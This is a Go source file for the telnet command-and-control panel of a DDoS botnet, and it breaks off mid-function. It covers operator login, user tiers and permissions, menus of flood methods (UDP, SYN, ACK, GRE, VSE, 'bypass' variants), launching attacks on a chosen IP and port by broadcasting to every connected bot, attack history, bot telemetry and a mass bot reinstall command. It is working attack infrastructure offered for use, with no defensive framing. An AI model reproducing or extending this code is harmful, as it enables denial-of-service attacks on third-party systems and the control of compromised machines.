package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

var (
	loadAnim = animation{
		frames: []string{
			"[    ]", "[=   ]", "[==  ]", "[=== ]", "[====]", "[ ===]", "[  ==]", "[   =]",
			"[    ]", "[   =]", "[  ==]", "[ ===]", "[====]", "[=== ]", "[==  ]", "[=   ]",
			"[    ]", "[=   ]", "[==  ]", "[=== ]", "[====]", "[ ===]", "[  ==]", "[   =]",
			"[    ]", "[   =]", "[  ==]", "[ ===]", "[====]", "[=== ]", "[==  ]", "[=   ]",
		},
		delay: 100 * time.Millisecond,
	}
	tickAnim = animation{
		frames: []string{"[x]", "[+]", "[*]", "[✓]", "[✔]"},
		delay:  300 * time.Millisecond,
	}
	flashAnim = animation{
		frames: []string{"🔺", "🔻", "🔸", "🔹"},
		delay:  200 * time.Millisecond,
	}
)

func (a *animation) play(c net.Conn, dur time.Duration, msg string) {
	end := time.Now().Add(dur)
	idx := 0
	c.Write([]byte("\r\033[K\033[?25l"))
	for time.Now().Before(end) {
		c.Write([]byte(fmt.Sprintf("\r%s %s", a.frames[idx], msg)))
		time.Sleep(a.delay)
		idx = (idx + 1) % len(a.frames)
	}
	c.Write([]byte("\033[?25h"))
}

func (a *animation) playCentered(c net.Conn, dur time.Duration, msg string) {
	end := time.Now().Add(dur)
	idx := 0
	c.Write([]byte("\r\033[K\033[?25l"))
	for time.Now().Before(end) {
		full := fmt.Sprintf("%s %s", a.frames[idx], msg)
		pad := (80 - len(full)) / 2
		if pad < 0 {
			pad = 0
		}
		c.Write([]byte(fmt.Sprintf("\r%s%s", strings.Repeat(" ", pad), full)))
		time.Sleep(a.delay)
		idx = (idx + 1) % len(a.frames)
	}
	c.Write([]byte("\033[?25h"))
}

func printErr(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;196m[!]\x1b[0m %s\r\n", msg)))
}

func printOK(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;82m[+]\x1b[0m %s\r\n", msg)))
}

func printPrompt(c net.Conn, msg string) {
	c.Write([]byte(fmt.Sprintf("\x1b[38;5;226m%s\x1b[0m ", msg)))
}

func drawProgress(c net.Conn, dur time.Duration, msg string) {
	start := time.Now()
	w := 20
	c.Write([]byte("\033[?25l"))
	for time.Now().Before(start.Add(dur)) {
		p := float64(time.Since(start)) / float64(dur)
		if p > 1 {
			p = 1
		}
		done := int(p * float64(w))
		if done > w {
			done = w
		}
		bar := strings.Repeat("█", done) + strings.Repeat("▒", w-done)
		c.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] %.0f%%", msg, bar, p*100)))
		time.Sleep(100 * time.Millisecond)
	}
	c.Write([]byte(fmt.Sprintf("\r\033[K%s [%s] 100%%\n", msg, strings.Repeat("█", w))))
	c.Write([]byte("\033[?25h"))
}

func fade(text string, c net.Conn) {
	shades := []int{240, 245, 250, 255, 250, 245, 240}
	c.Write([]byte("\033[?25l"))
	for i := 0; i < 3; i++ {
		for _, s := range shades {
			c.Write([]byte(fmt.Sprintf("\r\033[K\033[38;5;%dm%s", s, text)))
			time.Sleep(50 * time.Millisecond)
		}
	}
	c.Write([]byte("\033[0m\033[?25h"))
}

func clrscr(c net.Conn) {
	c.Write([]byte("\033[2J\033[H\033[3J\033[H\033[2J\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
}

func readline(c net.Conn) (string, error) {
	s, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		return s, err
	}
	return strings.TrimRight(s, "\r\n"), nil
}

func playGif(name string, c net.Conn) {
	fp := filepath.Join(gifDir, filepath.Base(name))
	if !strings.HasSuffix(fp, ".tfx") {
		return
	}
	f, err := os.Open(fp)
	if err != nil {
		return
	}
	defer f.Close()
	c.Write([]byte("\033[2J\033[H\033[?25l"))
	sc := bufio.NewScanner(f)
	buf := make([]byte, 0, 4096)
	for sc.Scan() {
		line := strings.TrimRight(sc.Text(), "\r\n")
		if strings.Contains(line, "\033[") {
			buf = append(buf, line...)
			buf = append(buf, "\r\n"...)
			if len(buf) > 2048 {
				c.Write(buf)
				buf = buf[:0]
			}
		} else {
			if len(buf) > 0 {
				c.Write(buf)
				buf = buf[:0]
			}
			c.Write([]byte(line + "\r\n"))
		}
		time.Sleep(2 * time.Millisecond)
	}
	if len(buf) > 0 {
		c.Write(buf)
	}
	c.Write([]byte("\033[?25h\r\n\r\n"))
}

func listGifs(c net.Conn) {
	files, err := os.ReadDir(gifDir)
	if err != nil {
		c.Write([]byte("no gifs dir\r\n"))
		return
	}
	var names []string
	for _, f := range files {
		if !f.IsDir() && strings.HasSuffix(f.Name(), ".tfx") {
			names = append(names, f.Name())
		}
	}
	if len(names) == 0 {
		c.Write([]byte("no .tfx files\r\n"))
		return
	}
	c.Write([]byte("\033[38;5;51mAvailable:\033[0m\r\n"))
	for i, n := range names {
		c.Write([]byte(fmt.Sprintf("  \033[38;5;214m%d.\033[0m %s\r\n", i+1, n)))
	}
}

func loginFlow(c net.Conn) (bool, *client) {
	clientIP := c.RemoteAddr().(*net.TCPAddr).IP.String()
	if !canLogin(clientIP) {
		c.Write([]byte("\033[0;31m[!] locked out, try later\033[0m\r\n"))
		return false, nil
	}
	banner := func() {
		c.Write([]byte("\033[2J\033[H"))
		gray := []int{232, 234, 236, 238, 240, 242, 244, 246, 248, 250, 252, 254, 255}
		art := []string{
			"╭══════════════════════════════════════════════════════════════════════════════╮",
			"║       ██████   ██████                    ███████████   ███                   ║",
			"║       ▒▒██████ ██████                    ▒▒███▒▒▒▒▒███ ▒▒▒                   ║",
			"║        ▒███▒█████▒███   ██████    ███████ ▒███    ▒███ ████   ██████         ║",
			"║        ▒███▒▒███ ▒███  ▒▒▒▒▒███  ███▒▒███ ▒██████████ ▒▒███  ███▒▒███        ║",
			"║        ▒███ ▒▒▒  ▒███   ███████ ▒███ ▒███ ▒███▒▒▒▒▒▒   ▒███ ▒███████         ║",
			"║        ▒███      ▒███  ███▒▒███ ▒███ ▒███ ▒███         ▒███ ▒███▒▒▒          ║",
			"║        ▒███      ▒███  ███▒▒███ ▒███ ▒███ ▒███         ▒███ ▒███▒▒▒          ║",
			"║        █████     █████▒▒████████▒▒███████ █████        █████▒▒██████         ║",
			"║       ▒▒▒▒▒     ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒███▒▒▒▒▒        ▒▒▒▒▒  ▒▒▒▒▒▒          ║",
			"║                                 ███ ▒███                                     ║",
			"║                                ▒▒██████                                      ║",
			"║                                  ▒▒▒▒▒▒                                      ║",
			"╰══════════════════════════════════════════════════════════════════════════════╯",
		}
		for i, line := range art {
			clr := gray[i*len(gray)/len(art)]
			c.Write([]byte(fmt.Sprintf("\x1b[38;5;%dm%s\033[0m\n", clr, line)))
		}
	}
	banner()

	for try := 0; try < 3; try++ {
		c.Write([]byte("\n"))
		c.Write([]byte("                       \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion --- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\033[0m\n"))
		c.Write([]byte("\033[38;5;245m                               ☉ Username\033[38;5;255m: \033[0m"))
		user, _ := readline(c)
		c.Write([]byte("\033[38;5;245m                               ☉ Password\033[38;5;255m: \033[0m"))
		pass, _ := readline(c)
		c.Write([]byte("\033[0m"))

		if ok, a := tryLogin(user, pass); ok {
			clearLogin(clientIP)
			s, tok, err := startSess(*a, clientIP, "terminal")
			if err != nil {
				printErr(c, "session error: "+err.Error())
				continue
			}
			loadAnim.playCentered(c, 2*time.Second, "Authenticating...\r")
			tickAnim.playCentered(c, 1*time.Second, "      Success!!!\r")
			playGif("crow.tfx", c)
			clrscr(c)
			return true, &client{
				conn: c, token: tok, sid: s.ID,
				user: acct{
					Username: a.Username, Password: a.Password,
					Expire: a.Expire, Level: a.Level,
					APIToken: a.APIToken, APISecret: a.APISecret,
				},
			}
		}
		authLog(user, clientIP, false)
		left := 2 - try
		banner()
		c.Write([]byte(fmt.Sprintf("\033[38;5;196m[!] Bad credentials. %d left.\033[0m\n\n", left)))
		if try == 2 {
			clrscr(c)
			c.Write([]byte("\033[0;31m[!] locked out\033[0m\n"))
			return false, nil
		}
	}
	c.Close()
	return false, nil
}

func helpMenu(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mUser Menu\x1b[38;5;231m §                  ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╢  │    │    │    │    │    │  ║")
	w("\x1b[38;5;231m║   \x1b[38;5;41mBasic Commands   \x1b[38;5;231m║  \x1b[38;5;41mOverview + Description  \x1b[38;5;231m║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║")
	w("\x1b[38;5;231m╠════════════════════╬══════════════════════════╬══════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. bots          \x1b[38;5;231m║ Manage connected bots    ║ ╔══════════════════════════╗ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. clear         \x1b[38;5;231m║ Clear the screen         ║ ║ L7: HTTP/HTTPS/TLS/SSL   ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. help          \x1b[38;5;231m║ Show this help menu      ║ ║ L6: COMPRESSION/ENCRYPT  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. methods       \x1b[38;5;231m║ Show attack methods      ║ ║ L5: SESSION/RPC/NETBIOS  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. ongoing       \x1b[38;5;231m║ List ongoing attacks     ║ ║ L4: TCP/UDP/SCTP/PORTS   ║ ║")
	w("\x1b[38;5;231m╠════════════════════╩══════════════════════════╢ ║ L3: IP/ICMP/ARP/ROUTING  ║ ║")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Menu\x1b[38;5;231m §                ║ ╚══════════════════════════╝ ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╢")
	w("\x1b[38;5;231m║\x1b[38;5;50m◉ Attack Commands ◉\x1b[38;5;231m ║  \x1b[38;5;50mOverview + Description  \x1b[38;5;231m║ ╔══════════════════════════╗ ║")
	w("\x1b[38;5;231m╠════════════════════╬══════════════════════════║ ║ [1][2][3][4][5][6][7][8] ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. allattacks    \x1b[38;5;231m║ Show all attacks         ║ ║  ●  ●  ○  ●  ○  ●  ○  ●  ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. stopattack    \x1b[38;5;231m║ Stop a running attack    ║ ║      24-PORT SWITCH      ║ ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. attackhistory \x1b[38;5;231m║ View attack history      ║ ╚══════════════════════════╝ ║")
	w("\x1b[38;5;231m╠════════════════════╩═════════════════╦════════╩══════════════════════════════╣")
	w("\x1b[38;5;231m║  \x1b[38;5;45mEg.. !Method IP Port Duration ⚑ \x1b[38;5;231m    ║          ⚔ Attack Example ⚔           ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════╩═══════════════════════════════════════╯")
}

func commandLoop(c net.Conn, uc *client) {
	clrscr(c)
	c.Write([]byte("\r\n\r\n"))
	fade(fmt.Sprintf("\033[0mWelcome %s! Type 'help' for commands.", uc.user.Username), c)
	c.Write([]byte("\r\n"))
	helpMenu(c)

	for {
		c.Write([]byte("\n\r\033[38;5;146m[\033[38;5;161mPro\033[38;5;89mmpt\033[38;5;146m]\033[38;5;82m► \033[0m"))
		input, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			if err == io.EOF {
				return
			}
			c.Close()
			return
		}
		input = strings.TrimRight(input, "\r\n")
		parts := strings.Fields(input)
		if len(parts) == 0 {
			continue
		}
		op := strings.ToLower(parts[0])

		switch op {
		case "gif", "gifs":
			cmdGif(parts, c)

		case "!udp", "!udpsmart", "!tcp", "!syn", "!ack", "!gre", "!vse", "!xmas", "!pps", "!stomp", "!amp", "!rst":
			cmdFlood(parts, c, uc)

		case "ongoing":
			cmdOngoing(c, uc)

		case "allattacks":
			cmdAllFloods(c)

		case "botstatus":
			cmdTelemetry(c)

		case "stopattack":
			cmdStop(c)

		case "attackhistory":
			cmdHistory(c)

		case "bots", "bot":
			cmdBots(c)

		case "clear":
			clrscr(c)
			c.Write([]byte("\r\n"))
			drawBox(c, "Screen Cleared", "TERMINAL RESET", []string{"Status:    REFRESHED", "Action:    CLEARED", "Time:      " + time.Now().Format("15:04:05")})

		case "logout", "exit":
			clrscr(c)
			c.Write([]byte("\r\n\x1b[38;5;196mLogging out...\x1b[0m\r\nGoodbye!\r\n"))
			time.Sleep(1 * time.Second)
			c.Close()
			return

		case "help":
			helpMenu(c)

		case "admin":
			if uc.user.lvl() > tierAdmin {
				printErr(c, "no permission")
				continue
			}
			adminMenu(c)

		case "owner":
			if uc.user.lvl() > tierOwner {
				printErr(c, "no permission")
				continue
			}
			ownerMenu(c)

		case "!reinstall":
			cmdReinstall(c, uc)

		case "adduser":
			cmdAddUser(c, uc)

		case "deluser":
			cmdDelUser(c, uc)

		case "users":
			cmdUsers(c)

		case "methods", "?":
			methodList(c)

		case "rbac":
			cmdRBAC(parts, c, uc)

		default:
			c.Write([]byte("unknown command, type 'help'\n\r"))
		}
	}
}

func cmdGif(parts []string, c net.Conn) {
	clrscr(c)
	if len(parts) < 2 {
		c.Write([]byte("\r\nUsage: gif list | gif <file>\r\n"))
		return
	}
	if strings.ToLower(parts[1]) == "list" {
		listGifs(c)
		return
	}
	name := parts[1]
	if !checkFilename(name) {
		if !strings.HasSuffix(name, ".tfx") {
			name += ".tfx"
		}
		if !checkFilename(name) {
			printErr(c, "invalid filename")
			return
		}
	}
	if !strings.HasSuffix(name, ".tfx") {
		name += ".tfx"
	}
	playGif(name, c)
}

func cmdFlood(parts []string, c net.Conn, uc *client) {
	clrscr(c)
	if !uc.user.canUse(parts[0]) {
		printErr(c, "no permission for this method")
		return
	}
	if len(parts) < 4 {
		printErr(c, "usage: method ip port duration")
		return
	}
	method, ip, port, durStr := parts[0], parts[1], parts[2], parts[3]
	if !checkIP(ip) {
		printErr(c, "bad ip")
		validLog(c.RemoteAddr().String(), "IP", ip)
		return
	}
	if !checkPort(port) {
		printErr(c, "bad port")
		validLog(c.RemoteAddr().String(), "PORT", port)
		return
	}
	dur, err := time.ParseDuration(durStr + "s")
	if err != nil || dur < 1*time.Second || dur > 3600*time.Second {
		printErr(c, "bad duration (1-3600s)")
		validLog(c.RemoteAddr().String(), "DUR", durStr)
		return
	}
	if ok, reason := quotaOk(uc.user.Username, dur); !ok {
		printErr(c, reason)
		quotaLog(uc.user.Username, "attack")
		return
	}
	flashAnim.play(c, 1*time.Second, "Launching...")
	c.Write([]byte("\r\n"))
	drawBox(c, "Attack Launched", "ACTIVE",
		[]string{"Method:    " + method, "Target:    " + ip + ":" + port, "Duration:  " + durStr + "s"})

	a := flood{method: method, target: ip, port: port, dur: dur, started: time.Now(), who: uc.user.Username}
	runMu.Lock()
	running[c] = a
	runMu.Unlock()
	histMu.Lock()
	hist = append(hist, a)
	histMu.Unlock()
	go func(conn net.Conn, atk flood) {
		time.Sleep(atk.dur)
		runMu.Lock()
		delete(running, conn)
		runMu.Unlock()
		tickAnim.play(conn, 1*time.Second, "Attack done!")
	}(c, a)

	var payload cmd
	copy(payload.Method[:], method)
	ipb := net.ParseIP(ip).To4()
	if ipb != nil {
		copy(payload.TargetIP[:], ipb)
	}
	portN, _ := strconv.Atoi(port)
	payload.Port = uint16(portN)
	durN, _ := strconv.Atoi(durStr)
	payload.Duration = uint32(durN)
	floodAll(payload)
}

func cmdOngoing(c net.Conn, uc *client) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	runMu.Lock()
	a, ok := running[c]
	if ok {
		rem := time.Until(a.started.Add(a.dur))
		if rem > 0 {
			drawBox(c, "Attack Running", "IN PROGRESS",
				[]string{"Method:    " + a.method, "Target:    " + a.target + ":" + a.port,
					"Remaining: " + strconv.Itoa(int(rem.Seconds())) + "s",
					"Elapsed:   " + strconv.Itoa(int(time.Since(a.started).Seconds())) + "s"})
		} else {
			delete(running, c)
			drawBox(c, "Attack Done", "COMPLETED", []string{"Status: finished"})
		}
	} else {
		drawBox(c, "No Active Attack", "IDLE", []string{"Nothing running"})
	}
	runMu.Unlock()
}

func cmdAllFloods(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	combined := activeFloods()
	if len(combined) == 0 {
		drawBox(c, "No Attacks", "ALL IDLE", []string{"Everything quiet"})
		return
	}
	var lines []string
	for i, a := range combined {
		if i >= 5 {
			lines = append(lines, fmt.Sprintf("+ %d more ...", len(combined)-5))
			break
		}
		rem := time.Until(a.started.Add(a.dur))
		if rem > 0 {
			lines = append(lines, fmt.Sprintf("%d) %-8s → %s:%s  %ds left", i+1, a.method, a.target, a.port, int(rem.Seconds())))
		}
	}
	drawBox(c, "Active Attacks", fmt.Sprintf("%d RUNNING", len(combined)), lines)
}

func cmdStop(c net.Conn) {
	runMu.Lock()
	if _, ok := running[c]; ok {
		delete(running, c)
		var stop cmd
		copy(stop.Method[:], "STOP")
		floodAll(stop)
		runMu.Unlock()
		clrscr(c)
		drawBox(c, "Attack Stopped", "TERMINATED", []string{"Bots notified", "Time: " + time.Now().Format("15:04:05")})
	} else {
		runMu.Unlock()
		printErr(c, "no attack running")
	}
}

func cmdHistory(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	histMu.Lock()
	var lines []string
	for i, a := range hist {
		lines = append(lines, fmt.Sprintf("%d) %-8s %-8s %s:%s %s", i+1, a.who, a.method, a.target, a.port, a.dur))
	}
	histMu.Unlock()
	if len(lines) == 0 {
		drawBox(c, "Attack History", "EMPTY", []string{"No records"})
		return
	}
	display := lines
	if len(display) > 5 {
		display = display[:5]
		display = append(display, fmt.Sprintf("... %d more", len(lines)-5))
	}
	drawBox(c, "Attack History", fmt.Sprintf("%d RECORDS", len(lines)), display)
}

func cmdBots(c net.Conn) {
	count := nodeCount()
	clrscr(c)
	c.Write([]byte("\r\n"))
	drawBox(c, "Bot Network", "LIVE", []string{
		fmt.Sprintf("Connected: %d", count),
		"Status:    ACTIVE",
		"Updated:   " + time.Now().Format("15:04:05"),
	})
}

func adminMenu(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	w("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m1. adduser      \x1b[38;5;231m- Add a new user                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m- Delete a user                                           ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m3. users        \x1b[38;5;231m- List all users                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m4. rbac         \x1b[38;5;231m- Manage permissions                                     ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m5. botstatus    \x1b[38;5;231m- Bot status details                                     ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func ownerMenu(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	w("\x1b[38;5;231m║                               \x1b[38;5;51mOwner Panel\x1b[38;5;231m                                    ║")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m1. gif          \x1b[38;5;231m- Play animations                                        ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m2. deluser      \x1b[38;5;231m- Delete a user                                          ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m3. rbac         \x1b[38;5;231m- Manage permissions                                     ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m4. session      \x1b[38;5;231m- View/kill sessions                                     ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func cmdReinstall(c net.Conn, uc *client) {
	clrscr(c)
	if uc.user.lvl() > tierOwner {
		printErr(c, "no permission")
		return
	}
	printPrompt(c, "Reinstall all bots? (yes/no):")
	ans, _ := readline(c)
	if strings.ToLower(ans) != "yes" {
		printErr(c, "cancelled")
		return
	}
	loadAnim.play(c, 3*time.Second, "Reinstalling...")
	var payload cmd
	copy(payload.Method[:], "!reinstall")
	floodAll(payload)
	tickAnim.play(c, 1*time.Second, "Done!")
}

func cmdAddUser(c net.Conn, uc *client) {
	if uc.user.lvl() > tierAdmin {
		printErr(c, "no permission")
		return
	}
	printPrompt(c, "Username:")
	user, _ := readline(c)
	printPrompt(c, "Password:")
	pass, _ := readline(c)
	printPrompt(c, "Level (Owner/Admin/Pro/Basic):")
	level, _ := readline(c)

	raw, err := os.ReadFile(userFile)
	if err != nil {
		printErr(c, "cant read users")
		return
	}
	var users []acct
	json.Unmarshal(raw, &users)
	apiTok, apiSec, err := makeAPICreds()
	if err != nil {
		printErr(c, "keygen error")
		return
	}
	hpw, err := hashPass(pass)
	if err != nil {
		printErr(c, "hash error")
		return
	}
	hsec, err := hashKey(apiSec)
	if err != nil {
		printErr(c, "hash error")
		return
	}
	users = append(users, acct{
		Username: user, Password: hpw, Expire: time.Now().AddDate(1, 0, 0),
		Level: level, APIToken: apiTok, APISecret: hsec,
	})
	out, _ := json.MarshalIndent(users, "", "  ")
	if os.WriteFile(userFile, out, 0600) != nil {
		printErr(c, "write error")
		return
	}
	clrscr(c)
	drawBox(c, "User Created", "SUCCESS", []string{
		"Username:  " + user, "Level:     " + level,
		"Expires:   " + time.Now().AddDate(1, 0, 0).Format("2006-01-02"),
		"API Token: " + apiTok, "API Secret:" + apiSec,
	})
}

func cmdDelUser(c net.Conn, uc *client) {
	if uc.user.lvl() > tierAdmin {
		printErr(c, "no permission")
		return
	}
	printPrompt(c, "Username to delete:")
	user, _ := readline(c)
	raw, err := os.ReadFile(userFile)
	if err != nil {
		printErr(c, "cant read users")
		return
	}
	var users []acct
	json.Unmarshal(raw, &users)
	found := false
	for i, u := range users {
		if u.Username == user {
			users = append(users[:i], users[i+1:]...)
			found = true
			break
		}
	}
	if !found {
		printErr(c, "user not found: "+user)
		return
	}
	out, _ := json.MarshalIndent(users, "", "  ")
	if os.WriteFile(userFile, out, 0600) != nil {
		printErr(c, "write error")
		return
	}
	clrscr(c)
	drawBox(c, "User Deleted", "REMOVED", []string{"Username: " + user, "Remaining: " + strconv.Itoa(len(users))})
}

func cmdUsers(c net.Conn) {
	raw, err := os.ReadFile(userFile)
	if err != nil {
		printErr(c, "cant read users")
		return
	}
	var users []acct
	json.Unmarshal(raw, &users)
	clrscr(c)
	var lines []string
	for _, u := range users {
		lines = append(lines, fmt.Sprintf("%-12s %-8s exp:%s", u.Username, u.Level, u.Expire.Format("2006-01-02")))
	}
	drawBox(c, "Users", fmt.Sprintf("%d TOTAL", len(users)), lines)
}

func methodList(c net.Conn) {
	clrscr(c)
	c.Write([]byte("\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮")
	w("\x1b[38;5;231m║                § \x1b[38;5;51mAttack Methods\x1b[38;5;231m §             ║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║")
	w("\x1b[38;5;231m╠════════════════════╦══════════════════════════╬══════════════════════════════╣")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !udpsmart     \x1b[38;5;231m║ Smart UDP Bypass         ║        LAYER 4               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !udp          \x1b[38;5;231m║ UDP Flood                ║     TCP/UDP/SCTP              ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !tcp          \x1b[38;5;231m║ TCP Flood                ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !syn          \x1b[38;5;231m║ SYN Flood                ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !ack          \x1b[38;5;231m║ ACK Flood                ║        LAYER 4+               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !gre          \x1b[38;5;231m║ GRE Flood                ║     SPECIAL METHODS           ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !vse          \x1b[38;5;231m║ Valve Source Engine       ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !xmas         \x1b[38;5;231m║ XMAS Flood               ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m❃. !pps          \x1b[38;5;231m║ PPS Bypass               ║                               ║")
	w("\x1b[38;5;231m║   \x1b[38;5;45m✪. !stomp        \x1b[38;5;231m║ TCP Stomp                ║                               ║")
	w("\x1b[38;5;231m╠════════════════════╩══════════════════════════╩══════════════════════════════╣")
	w("\x1b[38;5;231m║  \x1b[38;5;45mUsage: !method IP port duration\x1b[38;5;231m                                             ║")
	w("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯")
}

func cmdRBAC(parts []string, c net.Conn, uc *client) {
	if uc.user.lvl() > tierAdmin {
		printErr(c, "no permission")
		return
	}
	if len(parts) < 2 {
		perms := getPerms()
		clrscr(c)
		c.Write([]byte("\r\n"))
		w := func(s string) { c.Write([]byte(s + "\n\r")) }
		w("\x1b[38;5;231m╭──────────────────────────────────────────────────────────────────────────────╮")
		w("\x1b[38;5;231m│                          \x1b[38;5;51mPermissions\x1b[38;5;231m                                         │")
		w("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤")
		methods := make([]string, 0, len(perms))
		for m := range perms {
			methods = append(methods, m)
		}
		sort.Strings(methods)
		for _, m := range methods {
			lvs := strings.Join(perms[m], ", ")
			if len(lvs) > 50 {
				lvs = lvs[:47] + "..."
			}
			w(fmt.Sprintf("\x1b[38;5;231m│ \x1b[38;5;45m%-15s \x1b[38;5;231m: \x1b[38;5;82m%-50s \x1b[38;5;231m│", m, lvs))
		}
		w("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤")
		w("\x1b[38;5;231m│              \x1b[38;5;51mrbac <method> get/set <levels...>\x1b[38;5;231m                              │")
		w("\x1b[38;5;231m╰──────────────────────────────────────────────────────────────────────────────╯")
		return
	}
	if len(parts) < 3 {
		printErr(c, "usage: rbac <method> <set|get> [levels...]")
		return
	}
	method, action := parts[1], parts[2]
	switch action {
	case "get":
		perms := getPerms()
		if lvs, ok := perms[method]; ok {
			c.Write([]byte(fmt.Sprintf("%s: %s\n\r", method, strings.Join(lvs, ", "))))
		} else {
			printErr(c, "method not found: "+method)
		}
	case "set":
		if len(parts) < 4 {
			printErr(c, "usage: rbac <method> set <level1> <level2> ...")
			return
		}
		levels := parts[3:]
		ok := roles()
		for _, l := range levels {
			found := false
			for _, v := range ok {
				if l == v {
					found = true
					break
				}
			}
			if !found {
				printErr(c, fmt.Sprintf("bad level: %s (valid: %s)", l, strings.Join(ok, ", ")))
				return
			}
		}
		if err := setPerms(method, levels); err != nil {
			printErr(c, "error: "+err.Error())
		} else {
			printOK(c, method+" updated")
		}
	default:
		printErr(c, "use 'set' or 'get'")
	}
}

func cmdTelemetry(c net.Conn) {
	clrscr(c)
	infos := liveNodes()
	total := len(infos)
	diag := 0
	osCounts := make(map[string]int)
	for _, b := range infos {
		os := strings.TrimSpace(b.Sys.OS)
		if os != "" {
			diag++
			osCounts[os]++
		}
	}
	if total == 0 {
		drawBox(c, "Bot Telemetry", "EMPTY", []string{fmt.Sprintf("Diagnosed: %d  OS types: %d", diag, len(osCounts)), "No bots reporting"})
		return
	}
	sort.Slice(infos, func(i, j int) bool { return infos[i].LastPing.After(infos[j].LastPing) })
	perPage := 5
	if perPage > total {
		perPage = total
	}
	pages := (total + perPage - 1) / perPage
	page := 0
	for {
		telemetryPage(c, infos, page, perPage, pages, total, diag, len(osCounts))
		if pages <= 1 {
			break
		}
		c.Write([]byte("\x1b[38;5;51m[n]ext [p]rev [q]uit: \x1b[0m"))
		ch, err := readline(c)
		if err != nil {
			break
		}
		switch strings.TrimSpace(strings.ToLower(ch)) {
		case "n", "next":
			if page+1 < pages {
				page++
			}
		case "p", "prev":
			if page > 0 {
				page--
			}
		case "", "q", "quit":
			return
		}
	}
}

func telemetryPage(c net.Conn, infos []node, page, perPage, pages, total, diag, uniqOS int) {
	c.Write([]byte("\033[H\033[2J\r\n"))
	w := func(s string) { c.Write([]byte(s + "\n\r")) }
	w("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮")
	tblRow(c, "   Bot Telemetry Dashboard")
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	tblRow(c, fmt.Sprintf("   Bots: %-5d  Diag: %-5d  OS: %-5d", total, diag, uniqOS))
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")
	tblRow(c, fmt.Sprintf("   Page %d/%d", page+1, pages))
	w("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╣")

	start := page * perPage
	end := start + perPage
	if end > len(infos) {
		end = len(infos)
	}
